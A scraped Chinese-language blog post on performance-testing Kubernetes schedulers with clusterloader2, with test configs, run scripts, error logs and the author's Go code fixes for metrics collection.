basename:latency-pod-rcobjectTemplatePath:rc-benchmark.yamltemplateFillMap:Replicas:1Group:latencyCpuRequest:{{$LATENCY_POD_CPU}}mMemoryRequest:{{$LATENCY_POD_MEMORY}}M- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Creating latency pods# Remove latency pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:latency-pod-rcobjectTemplatePath:rc-benchmark.yaml- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:gather- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:gather- name:Deleting latancy pods# Delete pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc-benchmark.yaml- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Deleting saturation pods# Collect measurements- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:gather- Identifier:TestMetricsMethod:TestMetricsParams:action:gathersystemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}  rc-benchmark.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  apiVersion:v1kind:ReplicationControllermetadata:name:{{.Name}}labels:group:{{.Group}}spec:replicas:{{.Replicas}}selector:name:{{.Name}}template:metadata:labels:name:{{.Name}}group:{{.Group}}spec:containers:# - image: 192.168.182.101:5000/com.inspur/pause-amd64:3.1- image:10.151.11.61:5000/com.inspur/pause-amd64:3.1imagePullPolicy:IfNotPresentname:{{.Name}}ports:resources:requests:cpu:{{.CpuRequest}}memory:{{.MemoryRequest}}# Add not-ready/unreachable tolerations for 15 minutes so that node# failure doesn\u0026#39;t trigger pod deletion.tolerations:- key:\u0026#34;node.kubernetes.io/not-ready\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900- key:\u0026#34;node.kubernetes.io/unreachable\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900  执行脚本benchmark_clusterloder.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  #!bash  cd /home/wangb/perf-test/clusterloader2 # ssh访问参数 export KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa # master节点信息 MASTER_NAME=node61 TEST_MASTER_IP=10.151.11.61 TEST_MASTER_INTERNAL_IP=10.151.11.61 KUBE_CONFIG=${HOME}/.kube/config # 测试配置文件 TEST_CONFIG=\u0026#39;/home/wangb/perf-test/clusterloader2/testing/density/config-benchmark.yaml\u0026#39; # 测试报告目录位置 REPORT_DIR=\u0026#39;./reports\u0026#39; # 测试日志打印文件 LOG_FILE=\u0026#39;test.log\u0026#39; ./clusterloader --kubeconfig=$KUBE_CONFIG \\  --mastername=$TEST_MASTER_IP \\  --masterip=$MASTER_IP \\  --master-internal-ip=TEST_MASTER_INTERNAL_IP \\  --testconfig=$TEST_CONFIG \\  --report-dir=$REPORT_DIR \\  --alsologtostderr 2\u0026gt;\u0026amp;1 | tee $LOG_FILE   2 batch测试 batch测试是测试kube-batch调度器性能和pod延时指标\nconfig-batch.yaml 测试kube-batch调度器的测试配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255  # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).#Constants# {{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \u0026#34;\u0026#34;}}# 根据100节点规模，使用100_nodes/constraints.yaml进行测试{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \u0026#34;./100_nodes/constraints.yaml\u0026#34;}}# {{$NODE_MODE := DefaultParam .NODE_MODE \u0026#34;allnodes\u0026#34;}}{{$NODE_MODE := DefaultParam .NODE_MODE \u0026#34;master\u0026#34;}}# 至少保证100个节点规模# 设置 NODES_PER_NAMESPACE 50，保证totalPods = 5000{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# 设置 NODES_PER_NAMESPACE 100，保证totalPods = 10000# {{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# PODS_PER_NODE 0 则禁用saturation{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 10}}# 并发数，目前aist 调度器 处理业务并发数20，会有阻塞。# DENSITY_TEST_THROUGHPUT 10 或 20 进行测试 注意跟下面tuningSets配置 qpsLoad: qps 保持一致{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 5}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.# {{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}# {{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 35}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 10}}# MIN_LATENCY_PODS为0，则禁用latency# {{$MIN_LATENCY_PODS := 0}}{{$MIN_LATENCY_PODS := 0}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS false}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \u0026#34;\u0026#34;}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}# 总pod数量：ns数量*每个ns的pod数（ PODS_PER_NODE * NODES_PER_NAMESPACE ）{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}# 如果 SATURATION, 设置 latencyReplicas = 0 则禁用latency# {{$latencyReplicas := 0}}# if latency set latency{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}# {{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$saturationRCTimeout := 3600}}{{$podsTimeout := DivideFloat $totalLatencyPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$latencyPodsTimeout := MaxInt $podsTimeout 7200}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won\u0026#39;t fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711# 这里的超时 是wait_for_controlled_pods 时使用，一旦超过阈值，就会设置该pod为timeout# {{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 3600}}{{$latencyRCHardTimeout := MaxInt $latencyPodsTimeout 3600}}# add by binge# SchedulingThroughput 默认是在saturation中添加，自定义又在latency添加# 为避免调度器2个场景中的调度器吞吐量混淆，每次只统计一种场景下的调度器吞吐量SchedulingThroughput# 可以通过设置某场景的pod副本数为0方式，禁用该场景name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:# qps: 5# custom valueqps:{{$DENSITY_TEST_THROUGHPUT}}{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MODE}}resourceConstraints:{{$DENSITY_RESOURCE_CONSTRAINTS_FILE}}systemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}# Create saturation pods- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = saturationthreshold:{{$saturationRCTimeout}}s- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = saturationoperationTimeout:{{$saturationRCHardTimeout}}s- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:1tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc-batch.yamltemplateFillMap:Replicas:{{$podsPerNamespace}}Group:saturationCpuRequest:10mMemoryRequest:10M- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:startlabelSelector:group = saturation- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:gather- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:gather- name:Creating saturation pods# Create latency pods- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = latencythreshold:{{$latencyPodsTimeout}}s# custom threshold params == saturationRCTimeout# latency SchedulingThroughput add by binge- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:startlabelSelector:group = latency- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = latency# operationTimeout: 15moperationTimeout:{{$latencyRCHardTimeout}}s- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:{{$latencyReplicas}}tuningSet:Uniform5qpsobjectBundle:- basename:latency-pod-rcobjectTemplatePath:rc-batch.yamltemplateFillMap:Replicas:1Group:latencyCpuRequest:{{$LATENCY_POD_CPU}}mMemoryRequest:{{$LATENCY_POD_MEMORY}}M- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Creating latency pods# Remove latency pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:latency-pod-rcobjectTemplatePath:rc-batch.yaml- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:gather- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:gather- name:Deleting latancy pods# Delete pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc-batch.yaml- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Deleting saturation pods# Collect measurements- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:gather- Identifier:TestMetricsMethod:TestMetricsParams:action:gathersystemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}  rc-batch.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  apiVersion:v1kind:ReplicationControllermetadata:name:{{.Name}}labels:group:{{.Group}}spec:replicas:{{.Replicas}}selector:name:{{.Name}}template:metadata:labels:name:{{.Name}}group:{{.Group}}spec:# define custom schedulerschedulerName:kube-batchcontainers:# - image: 192.168.182.101:5000/com.inspur/pause-amd64:3.1- image:10.151.11.61:5000/com.inspur/pause-amd64:3.1imagePullPolicy:IfNotPresentname:{{.Name}}ports:resources:limits:cpu:{{.CpuRequest}}memory:{{.MemoryRequest}}requests:cpu:{{.CpuRequest}}memory:{{.MemoryRequest}}# Add not-ready/unreachable tolerations for 15 minutes so that node# failure doesn\u0026#39;t trigger pod deletion.tolerations:- key:\u0026#34;node.kubernetes.io/not-ready\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900- key:\u0026#34;node.kubernetes.io/unreachable\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900  执行脚本custom_clusterloader.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  #!bash  cd /home/wangb/perf-test/clusterloader2 # ssh访问参数 export KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa # master节点信息 MASTER_NAME=node61 TEST_MASTER_IP=10.151.11.61 TEST_MASTER_INTERNAL_IP=10.151.11.61 KUBE_CONFIG=${HOME}/.kube/config # 测试配置文件 TEST_CONFIG=\u0026#39;/home/wangb/perf-test/clusterloader2/testing/density/config-batch.yaml\u0026#39; # 测试报告目录位置 REPORT_DIR=\u0026#39;./reports\u0026#39; # 测试日志打印文件 LOG_FILE=\u0026#39;test.log\u0026#39; ./custom_clusterloader --kubeconfig=$KUBE_CONFIG \\  --mastername=$TEST_MASTER_IP \\  --masterip=$MASTER_IP \\  --master-internal-ip=TEST_MASTER_INTERNAL_IP \\  --testconfig=$TEST_CONFIG \\  --report-dir=$REPORT_DIR \\  --alsologtostderr 2\u0026gt;\u0026amp;1 | tee $LOG_FILE   6 问题 1. 提示 Getting master name error: master node not found和 Getting master internal ip error: didn\u0026rsquo;t find any InternalIP master IPs mastername和 internalip 参数需要配置\n1 2 3 4 5 6 7 8 9 10 11  I1211 11:10:31.302599 118141 clusterloader.go:105] ClusterConfig.Nodes set to 2 E1211 11:10:31.304485 118141 clusterloader.go:113] Getting master name error: master node not found E1211 11:10:31.307705 118141 clusterloader.go:122] Getting master external ip error: didn\u0026#39;t find any ExternalIP master IPs E1211 11:10:31.309369 118141 clusterloader.go:131] Getting master internal ip error: didn\u0026#39;t find any InternalIP master IPs I1211 11:10:31.309388 118141 clusterloader.go:206] Using config: {ClusterConfig:{KubeConfigPath:/root/.kube/config Nodes:2 Provider: MasterIPs:[] MasterInternalIPs:[] MasterName: KubemarkRootKubeConfigPath:} ReportDir:./reports EnablePrometheusServer:false TearDownPrometheusServer:false TestConfigPath: TestOverridesPath:[] PrometheusConfig:{EnableServer:false TearDownServer:true ScrapeEtcd:false ScrapeNodeExporter:false ScrapeKubelets:false ScrapeKubeProxy:true SnapshotProject:}} I1211 11:10:31.311334 118141 cluster.go:56] Listing cluster nodes: I1211 11:10:31.311348 118141 cluster.go:68] Name: node1, clusterIP: 192.168.182.101, externalIP: , isSchedulable: true I1211 11:10:31.311354 118141 cluster.go:68] Name: node2, clusterIP: 192.168.182.102, externalIP: , isSchedulable: true I1211 11:10:31.314575 118141 clusterloader.go:167] -------------------------------------------------------------------------------- I1211 11:10:31.314588 118141 clusterloader.go:168] Running /home/wangb/perf-test/clusterloader2/testing/density/config.yaml I1211 11:10:31.314591 118141 clusterloader.go:169] --------------------------------------------------------------------------------   2. Errors: [measurement call TestMetrics - TestMetrics error: [unexpected error (code: 0) in ssh connection to master: \u0026amp;errors.errorString{s:\u0026ldquo;error getting signer for provider : \u0026lsquo;GetSigner(\u0026hellip;) not implemented for \u0026lsquo;\u0026quot;}] 测试配置了TestMetrics measurement，但是没有通过。\nssh问题，参数不正确，还需要自定义环境变量配置KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa\n1 2 3 4 5 6 7 8 9 10 11 12 13  E1211 11:34:39.085551 19551 test_metrics.go:185] TestMetrics: [unexpected error (code: 0) in ssh connection to master: \u0026amp;errors.errorString{s:\u0026#34;error getting signer for provider : \u0026#39;GetSigner(...) not implemented for \u0026#39;\u0026#34;} unexpected error (code: 0) in ssh connection to master: \u0026amp;errors.errorString{s:\u0026#34;error getting signer for provider : \u0026#39;GetSigner(...) not implemented for \u0026#39;\u0026#34;}] I1211 11:34:49.103215 19551 simple_test_executor.go:345] Resources cleanup time: 10.017395168s E1211 11:34:49.103273 19551 clusterloader.go:177] -------------------------------------------------------------------------------- E1211 11:34:49.103291 19551 clusterloader.go:178] Test Finished E1211 11:34:49.103295 19551 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config.yaml E1211 11:34:49.103298 19551 clusterloader.go:180] Status: Fail E1211 11:34:49.103301 19551 clusterloader.go:182] Errors: [measurement call TestMetrics - TestMetrics error: [unexpected error (code: 0) in ssh connection to master: \u0026amp;errors.errorString{s:\u0026#34;error getting signer for provider : \u0026#39;GetSigner(...) not implemented for \u0026#39;\u0026#34;}] measurement call APIResponsiveness - APIResponsiveness error: top latency metric: there should be no high-latency requests, but: [got: {Resource:endpoints Subresource: Verb:GET Scope:namespace Latency:{Perc50:1.046ms Perc90:4.871ms Perc99:1.588679s} Count:33}; expected perc99 \u0026lt;= 1s] measurement call TestMetrics - TestMetrics error: [unexpected error (code: 0) in ssh connection to master: \u0026amp;errors.errorString{s:\u0026#34;error getting signer for provider : \u0026#39;GetSigner(...) not implemented for \u0026#39;\u0026#34;} unexpected error (code: 0) in ssh connection to master: \u0026amp;errors.errorString{s:\u0026#34;error getting signer for provider : \u0026#39;GetSigner(...) not implemented for \u0026#39;\u0026#34;}]] E1211 11:34:49.103310 19551 clusterloader.go:184] -------------------------------------------------------------------------------- F1211 11:34:49.106925 19551 clusterloader.go:276] 1 tests have failed!   3. 告警提示：Master node is not registered. Grabbing metrics from Scheduler, ControllerManager and ClusterAutoscaler is disabled. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  W1214 10:00:44.212402 40729 metrics_grabber.go:81] Master node is not registered. Grabbing metrics from Scheduler, ControllerManager and ClusterAutoscaler is disabled. I1214 10:00:44.268795 40729 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 10:00:44.268822 40729 container_resource_gatherer.go:172] Closed stop channel. Waiting for 0 workers I1214 10:00:44.268851 40729 container_resource_gatherer.go:180] Waitgroup finished. I1214 10:00:44.268935 40729 system_pod_metrics.go:82] skipping collection of system pod metrics E1214 10:00:44.268946 40729 test_metrics.go:185] TestMetrics: [text format parsing error in line 1: invalid metric name] I1214 10:00:54.301192 40729 simple_test_executor.go:345] Resources cleanup time: 10.031663914s E1214 10:00:54.301219 40729 clusterloader.go:177] -------------------------------------------------------------------------------- E1214 10:00:54.301222 40729 clusterloader.go:178] Test Finished E1214 10:00:54.301225 40729 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml E1214 10:00:54.301227 40729 clusterloader.go:180] Status: Fail E1214 10:00:54.301229 40729 clusterloader.go:182] Errors: [measurement call TestMetrics - TestMetrics error: [text format parsing error in line 1: invalid metric name]] E1214 10:00:54.301233 40729 clusterloader.go:184] -------------------------------------------------------------------------------- F1214 10:00:54.305222 40729 clusterloader.go:276] 1 tests have failed!   排查过程，结合分析源码：\n如果没有注册master节点，则测试不会统计调度器和controllers等组件信息 分处理逻辑，发现clusterloader2对master节点的判断条件不符合测试集群环境，如下。需要修改下clusterloader2的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // TODO: find a better way of figuring out if given node is a registered master. func IsMasterNode(nodeName string) bool { // We are trying to capture \u0026#34;master(-...)?$\u0026#34; regexp.  // However, using regexp.MatchString() results even in more than 35%  // of all space allocations in ControllerManager spent in this function.  // That\u0026#39;s why we are trying to be a bit smarter.  if strings.HasSuffix(nodeName, \u0026#34;master\u0026#34;) { return true } if len(nodeName) \u0026gt;= 10 { return strings.HasSuffix(nodeName[:len(nodeName)-3], \u0026#34;master-\u0026#34;) } return false }   原有代码程序对master节点判断逻辑为：nodename为master或者master-开头 修改代码：在system.IsMasterNode(node.Name) 引用处，新增条件： node.Labels[\u0026ldquo;node-role.kubernetes.io/master\u0026rdquo;] == \u0026ldquo;true\u0026rdquo; ，作为master节点判断\n4. EtcdMetrics信息获取不到：EtcdMetrics: failed to collect etcd database size 1 2 3  E1214 11:06:03.936128 2312 etcd_metrics.go:121] EtcdMetrics: failed to collect etcd database size   或者上报错误：TestMetrics: [text format parsing error in line 1: invalid metric name]\n1  E1211 11:42:36.545827 30129 test_metrics.go:185] TestMetrics: [text format parsing error in line 1: invalid metric name]   https://github.com/kubernetes/perf-tests/issues/875 提的问题没有人解答\n最初先把testMetic测试项关闭，暂时规避该问题。可能跟metric服务数据采集有关。后来排查了下日志打印信息，发现有多处报错，要逐个排查。\n分析源码应该是获取不到etcd的metrics导致，修改代码如下： measurement/common/simple/etcd_metrics\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  func (e *etcdMetricsMeasurement) getEtcdMetrics(host, provider string) ([]*model.Sample, error) { // Etcd is only exposed on localhost level. We are using ssh method  if provider == \u0026#34;gke\u0026#34; { klog.Infof(\u0026#34;%s: not grabbing etcd metrics through master SSH: unsupported for gke\u0026#34;, e) return nil, nil } // In https://github.com/kubernetes/kubernetes/pull/74690, mTLS is enabled for etcd server  // http://localhost:2382 is specified to bypass TLS credential requirement when checking  // etcd /metrics and /health.  //if samples, err := e.sshEtcdMetrics(\u0026#34;curl http://localhost:2382/metrics\u0026#34;, host, provider); err == nil {  // return samples, nil  //}  // fix: 问题错误信息：EtcdMetrics: failed to collect etcd database size  // 这里需要根据实际测试环境情况，进行硬编码配置。 add by wangb  // 先ssh，再执行metrics的cmd  if samples, err := e.sshEtcdMetrics(\u0026#34;curl https://localhost:2379/metrics -k --cert /etc/ssl/etcd/ssl/ca.pem --key /etc/ssl/etcd/ssl/ca-key.pem\u0026#34;, host, provider); err == nil { return samples, nil } // Use old endpoint if new one fails.  return e.sshEtcdMetrics(\u0026#34;curl http://localhost:2379/metrics\u0026#34;, host, provider) }   按上述修改后，再重新编译，问题解决\n5.报错找不到资源 TestMetrics: [the server could not find the requested resource (get pods kube-scheduler-192.168.182.101:10251)] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  I1214 14:14:20.039016 126597 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 14:14:20.039058 126597 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1214 14:14:20.039075 126597 resource_gather_worker.go:90] Closing worker for node1 I1214 14:14:20.039082 126597 container_resource_gatherer.go:180] Waitgroup finished. I1214 14:14:20.039181 126597 system_pod_metrics.go:82] skipping collection of system pod metrics E1214 14:14:20.039193 126597 test_metrics.go:185] TestMetrics: [the server could not find the requested resource (get pods kube-scheduler-192.168.182.101:10251)] I1214 14:14:30.103890 126597 simple_test_executor.go:345] Resources cleanup time: 10.064213743s E1214 14:14:30.104163 126597 clusterloader.go:177] -------------------------------------------------------------------------------- E1214 14:14:30.104170 126597 clusterloader.go:178] Test Finished E1214 14:14:30.104173 126597 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml E1214 14:14:30.104176 126597 clusterloader.go:180] Status: Fail E1214 14:14:30.104178 126597 clusterloader.go:182] Errors: [measurement call TestMetrics - TestMetrics error: [the server could not find the requested resource (delete pods kube-scheduler-192.168.182.101:10251)] measurement call TestMetrics - TestMetrics error: [the server could not find the requested resource (get pods kube-scheduler-192.168.182.101:10251)]] E1214 14:14:30.104180 126597 clusterloader.go:184] -------------------------------------------------------------------------------- F1214 14:14:30.104658 126597 clusterloader.go:276] 1 tests have failed!   分析可能是 view resource no match 查询资源url不正确导致？ 分析代码如下，可能是在msternode下构造request时有问题，定位原因为restclient构造url有问题。改用curl方式（可本地测试通过）直接获取调度器metrics common/simple/scheduler_latency.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  // Sends request to kube scheduler metrics func (s *schedulerLatencyMeasurement) sendRequestToScheduler(c clientset.Interface, op, host, provider, masterName string) (string, error) { opUpper := strings.ToUpper(op) if opUpper != \u0026#34;GET\u0026#34; \u0026amp;\u0026amp; opUpper != \u0026#34;DELETE\u0026#34; { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;unknown REST request\u0026#34;) } nodes, err := c.CoreV1().Nodes().List(metav1.ListOptions{}) if err != nil { return \u0026#34;\u0026#34;, err } var masterRegistered = false for _, node := range nodes.Items { if node.Labels[\u0026#34;node-role.kubernetes.io/master\u0026#34;] == \u0026#34;true\u0026#34; || system.IsMasterNode(node.Name) { masterRegistered = true } } var responseText string // masterRegistered时，client接口处理有问题，统一改使用curl -X 方式处理GET和DELETE add by wangb start  _ = masterRegistered //if masterRegistered {  // ctx, cancel := context.WithTimeout(context.Background(), singleRestCallTimeout)  // defer cancel()  //  // body, err := c.CoreV1().RESTClient().Verb(opUpper).  // Context(ctx).  // Namespace(metav1.NamespaceSystem).  // Resource(\u0026#34;pods\u0026#34;).  // Name(fmt.Sprintf(\u0026#34;kube-scheduler-%v:%v\u0026#34;, masterName, ports.InsecureSchedulerPort)).  // SubResource(\u0026#34;proxy\u0026#34;).  // Suffix(\u0026#34;metrics\u0026#34;).  // Do().Raw()  //  // if err != nil {  // return \u0026#34;\u0026#34;, err  // }  // responseText = string(body)  //} else {  // // If master is not registered fall back to old method of using SSH.  // if provider == \u0026#34;gke\u0026#34; {  // klog.Infof(\u0026#34;%s: not grabbing scheduler metrics through master SSH: unsupported for gke\u0026#34;, s)  // return \u0026#34;\u0026#34;, nil  // }  //  // cmd := \u0026#34;curl -X \u0026#34; + opUpper + \u0026#34; http://localhost:10251/metrics\u0026#34;  // sshResult, err := measurementutil.SSH(cmd, host+\u0026#34;:22\u0026#34;, provider)  // if err != nil || sshResult.Code != 0 {  // return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;unexpected error (code: %d) in ssh connection to master: %#v\u0026#34;, sshResult.Code, err)  // }  // responseText = sshResult.Stdout  //}  // curl http://localhost:10251/metrics 这个命令测试可用  cmd := \u0026#34;curl -X \u0026#34; + opUpper + \u0026#34; http://localhost:10251/metrics\u0026#34; sshResult, err := measurementutil.SSH(cmd, host+\u0026#34;:22\u0026#34;, provider) if err != nil || sshResult.Code != 0 { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;unexpected error (code: %d) in ssh connection to master: %#v\u0026#34;, sshResult.Code, err) } responseText = sshResult.Stdout // masterRegistered时，client接口处理有问题，统一改使用curl -X 方式处理GET和DELETE add by wangb end  return responseText, nil }   6. 测试结果指标异常输出 不是问题，这是测试工具成功生效，并返回提示断言信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  I1214 15:25:56.117594 96634 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 0, deleted 2, timeout: 0, unknown: 0 I1214 15:25:56.117625 96634 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 0/0 ReplicationControllers are running with all pods I1214 15:25:56.124212 96634 simple_test_executor.go:128] Step \u0026#34;Deleting saturation pods\u0026#34; ended I1214 15:25:56.245924 96634 api_responsiveness.go:119] APIResponsiveness: WARNING Top latency metric: {Resource:endpoints Subresource: Verb:PUT Scope:namespace Latency:{Perc50:2.65ms Perc90:22.594ms Perc99:1.122221s} Count:22}; threshold: 1s I1214 15:25:56.245949 96634 api_responsiveness.go:119] APIResponsiveness: WARNING Top latency metric: {Resource:namespaces Subresource: Verb:GET Scope:cluster Latency:{Perc50:11.99ms Perc90:1.005472s Perc99:1.084129s} Count:13}; threshold: 1s I1214 15:25:56.245957 96634 api_responsiveness.go:119] APIResponsiveness: WARNING Top latency metric: {Resource:nodes Subresource:status Verb:PATCH Scope:cluster Latency:{Perc50:1.00345s Perc90:1.00345s Perc99:1.00345s} Count:1}; threshold: 1s I1214 15:25:56.245962 96634 